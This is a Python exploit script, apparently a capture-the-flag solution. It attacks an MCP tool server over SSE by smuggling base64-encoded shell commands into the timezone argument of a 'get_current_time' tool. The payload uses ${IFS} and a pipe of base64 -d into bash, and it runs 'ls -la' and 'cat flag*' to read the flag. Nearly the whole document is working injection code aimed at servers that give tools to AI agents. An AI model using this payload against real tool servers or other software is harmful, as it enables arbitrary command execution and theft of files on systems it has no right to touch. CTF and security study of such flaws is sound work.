#!/usr/bin/env python3
import base64
import asyncio
from typing import Optional

from mcp import ClientSession
from mcp.client.sse import sse_client

server_url='http://HOSTNAME:PORT/sse'

async def main():
	streams_context = sse_client(url=server_url)
	streams = await streams_context.__aenter__()
	session_context = ClientSession(*streams)
	session: ClientSession = await session_context.__aenter__()
	await session.initialize()

	# Print tools
	#response = await session.list_tools()
	#tools = response.tools
	#print("\nConnected to server with tools:", [tool.name for tool in tools])
	
	print('Testing Tool...')
	result = await session.call_tool('get_current_time', {'tz': 'Europe/Athens'})
	print(result.content[0].text)
	print('\n')

	# The commands to inject
	commands = [
		'ls -la',
		'cat flag*'
	]

	print('Exploiting Tool...')
	for c in commands:
		# Convert the commands to base64
		cmd_b64 = base64.b64encode(c.encode('utf-8')).decode('utf-8')
		# Wrapper the command and run them in bash 
		result = await session.call_tool('get_current_time', {
			'tz': '"${IFS}true${IFS}&&${IFS}echo${IFS}"' + cmd_b64 + '"|base64${IFS}-d|bash${IFS}||true||/"'
		})
		print(result.content[0].text)

	# Close
	if session_context:
		await session_context.__aexit__(None, None, None)
	if streams_context:
		await streams_context.__aexit__(None, None, None)

if __name__ == "__main__":
	asyncio.run(main())
